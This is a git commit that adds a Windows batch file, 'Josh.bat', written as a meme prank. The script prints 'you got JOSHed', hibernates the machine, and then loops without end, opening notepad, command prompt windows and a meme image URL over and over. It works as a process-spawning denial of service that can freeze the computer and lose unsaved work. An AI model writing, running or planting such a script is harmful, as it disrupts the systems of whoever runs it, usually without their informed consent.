e44cb17228e213d202ef132778df0851e3ab1e39
Isaac❗  (Com enxaqueca) <147288252+Isaac4lves@users.noreply.github.com>
2023-12-10 19:08:53 -0300

    First Version

---
+++ Josh.bat
@@ -0,0 +1,28 @@
+@echo off
+echo you got JOSHed 
+
+shutdown /h
+
+:open 
+
+start notepad.exe ""
+
+start cmd.exe ""
+
+start "" "https://i.kym-cdn.com/entries/icons/facebook/000/047/264/josh_hutcherson_whistle.jpg"
+
+start notepad.exe ""
+
+start "" "https://i.kym-cdn.com/entries/icons/facebook/000/047/264/josh_hutcherson_whistle.jpg"
+
+start cmd.exe ""
+
+start cmd.exe ""
+
+start "" "https://i.kym-cdn.com/entries/icons/facebook/000/047/264/josh_hutcherson_whistle.jpg"
+
+start cmd.exe ""
+
+
+
+goto :open
